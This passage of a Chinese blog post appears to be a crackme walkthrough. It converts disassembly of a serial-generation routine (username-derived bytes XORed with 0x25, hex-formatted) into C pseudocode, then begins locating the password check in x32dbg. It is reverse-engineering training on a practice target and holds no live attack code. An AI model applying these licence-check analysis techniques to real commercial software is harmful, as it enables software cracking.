&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040728d&lt;/span> &lt;span class="no">jmp&lt;/span> &lt;span class="mi">0x40726a&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>前两条指令没什么可说的，&lt;code>movsx&lt;/code>还是第一次见，学习下。&lt;/p>
&lt;p>&lt;code>movsx&lt;/code> 从来源取数，不足的部分用来源的符号位填充，这里取的是&lt;code>var_8h[var_10h]&lt;/code>，一字节，到 &lt;code>edx&lt;/code> 寄存器。&lt;code>movsx&lt;/code>的好处是可以保留符号位，加载不同大小的数据时（比如来源是 &lt;code>word&lt;/code>，目标是 &lt;code>dword&lt;/code>），如果来源是负数，则填充符号位可以正确表示补码形式表示的负数。&lt;/p>
&lt;p>从&lt;code>var_8h[var_10h]&lt;/code>取数移入&lt;code>edx&lt;/code> 后，之后是一句简单的 &lt;code>xor&lt;/code>，逻辑异或运算。之后将&lt;code>xor&lt;/code>运算结果取低位1字节（&lt;code>dl&lt;/code>寄存器）移回&lt;code>var_8h[var_10h]&lt;/code>。&lt;/p>
&lt;p>之后自增，跳转循环，和之前的循环一样。将分析过的部分用伪代码表示如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h, ebp-8h
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_ch -&amp;gt; ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 猜测的函数签名 func(void*, int, void*, int)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_10h -&amp;gt; ebp-10h
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_10h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^=&lt;/span> &lt;span class="mh">0x25&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>继续看循环结束后的动作。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407292&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_14h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0x11&lt;/span> &lt;span class="c">; 17
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x00407299&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0x11&lt;/span> &lt;span class="c">; [0x11:4]=-1 ; 17
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x004072a0&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">fcn.00401302&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072a5&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_18h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072a8&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_1ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用一个函数，返回值赋值给&lt;code>var_18h&lt;/code>，同时初始化&lt;code>var_1ch&lt;/code>为 0。伪代码表示如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_14h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x11&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_18h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x11&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来又是一个循环。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072af&lt;/span> &lt;span class="no">cmp&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_1ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072b3&lt;/span> &lt;span class="no">jae&lt;/span> &lt;span class="mi">0x4072f2&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>不重复分析，进入循环体。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072b9&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_8h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072bc&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_1ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072bf&lt;/span> &lt;span class="no">movsx&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072c3&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_18h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072c6&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_1ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072c9&lt;/span> &lt;span class="no">shl&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072cc&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072ce&lt;/span> &lt;span class="no">lea&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">str.02x&lt;/span> &lt;span class="c">; 0x45de50，内容是 %02x
&lt;/span>&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="mi">0x004072d4&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">edx&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072d7&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_sp_4h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">ecx&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072db&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_sp_8h&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072df&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">fcn.00403dcd&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072e4&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_1ch&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072e7&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072ea&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_1ch&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072ed&lt;/span> &lt;span class="no">jmp&lt;/span> &lt;span class="mi">0x4072af&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>依然是从 &lt;code>var_8h[var_1ch]&lt;/code> 取数，之后把 &lt;code>var_18h&lt;/code> 和 &lt;code>var_1ch&lt;/code> 也取数，分别放到 &lt;code>eax&lt;/code>、&lt;code>edx&lt;/code>、&lt;code>ecx&lt;/code>。&lt;/p>
&lt;p>接着是一个没见过的命令，&lt;code>shl&lt;/code>，学习下。&lt;/p>
&lt;p>&lt;code>shl&lt;/code>是逻辑左移，和 c 中的 &lt;code>&amp;lt;&amp;lt;&lt;/code> 运算符一样，两个操作数，命令格式&lt;code>shl 寄存器,立即数&lt;/code>。&lt;/p>
&lt;p>这里做的就是 &lt;code>ecx&lt;/code>，也就是 &lt;code>var_1ch&lt;/code> 的值左移1位，众所周知左移n位可以看作乘上2^n^ ，所以这句 &lt;code>shl&lt;/code> 其实就是 &lt;code>var_1ch*2&lt;/code>。左移后结果加到了&lt;code>edx&lt;/code>，&lt;code>edx&lt;/code>是&lt;code>var_18h&lt;/code>。&lt;/p>
&lt;p>之后是一个&lt;code>lea&lt;/code>，加载地址，内容是常量字符串 &lt;code>%02x&lt;/code>，看起来是一个 c 格式化字符串。&lt;/p>
&lt;p>接着压栈传参，调用未知函数，结果忽略。伪代码表示如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_18h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%02x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_1ch&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>随后是变量自增，跳转回循环开头。&lt;/p>
&lt;p>我们把分析出来的伪代码再合并下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h, ebp-8h
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_ch -&amp;gt; ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 猜测的函数签名 func(void*, int, void*, int)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_10h -&amp;gt; ebp-10h
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_10h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^=&lt;/span> &lt;span class="mh">0x25&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">var_14h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x11&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_18h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x11&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_1ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_18h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%02x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_1ch&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后是循环结束后的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072f2&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_18h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072f5&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">eax&lt;/span> &lt;span class="err">+&lt;/span> &lt;span class="mi">0x10&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072f9&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_8h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072fc&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x004072ff&lt;/span> &lt;span class="no">call&lt;/span> &lt;span class="no">fcn.00402a36&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407304&lt;/span> &lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">var_18h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="c">; ---
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="err">0&lt;/span>&lt;span class="nf">x00407307&lt;/span> &lt;span class="no">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0x2c&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040730a&lt;/span> &lt;span class="no">pop&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="err">0&lt;/span>&lt;span class="nf">x0040730b&lt;/span> &lt;span class="no">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>首先是把&lt;code>var_18h[0x10]&lt;/code> 的值设为0。&lt;/p>
&lt;p>接着&lt;code>var_8h&lt;/code>做参数调未知函数。&lt;/p>
&lt;p>把&lt;code>var_18h&lt;/code>移到&lt;code>eax&lt;/code>，也就是&lt;code>cdecl&lt;/code>约定下的返回值位置。&lt;/p>
&lt;p>最后平栈，恢复&lt;code>ebp&lt;/code>，返回，函数结束。我们把所有内容的伪代码合并起来。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">int&lt;/span> &lt;span class="n">var_4h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// ebp-4h
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">var_8h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x8&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ebp-8h
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_ch -&amp;gt; ebp-ch
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_ch&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_ch&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 猜测的函数签名 func(void*, int, void*, int)
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_10h&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// var_10h -&amp;gt; ebp-10h
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_10h&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^=&lt;/span> &lt;span class="mh">0x25&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">var_14h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x11&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">var_18h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x11&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">var_1ch&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_18h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">var_1ch&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%02x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_8h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">var_1ch&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">var_18h&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x10&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">unknown_func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8h&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">var_18h&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>从这我们已经能看出具体算法了，未知函数可以猜测调试看看。&lt;/p>
&lt;h2 id="0x04-调试器---easy">0x04 调试器 - easy&lt;/h2>
&lt;p>调试的目标是确认生成序列号的算法，把分析出的伪代码中还不清楚用途的未知函数，分析出作用。&lt;/p>
&lt;h3 id="41-x32dbg">4.1 x32dbg&lt;/h3>
&lt;p>打开调试器后，先找到关键跳，在工具栏点击字符串工具图标，在下方搜索栏输入&lt;code>wrong pwd!&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-15.png"
loading="lazy"
alt="image-20210915140718400"
>&lt;/p>
&lt;p>跳到引用位置。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-18.png"
loading="lazy"
alt="image-20210915111455604"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-19.png"
loading="lazy"
alt="image-20210915111621678"
>&lt;/p>
&lt;p>之后可以按g，进入控制流视图，不过这个控制流视图有点不好看，我们也可以直接参考静态分析中的汇编，直接找到函数，并在入口下断点。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-20.png"
loading="lazy"
alt="image-20210915112358449"
>&lt;/p>
&lt;p>尝试随便输入一点内容，调试器命中。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-21.png"
loading="lazy"
alt="image-20210915112552389"
>&lt;/p>
&lt;p>接下来就可以用左上角的单步调试了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-22.png"
loading="lazy"
alt="image-20210915140939909"
>&lt;/p>
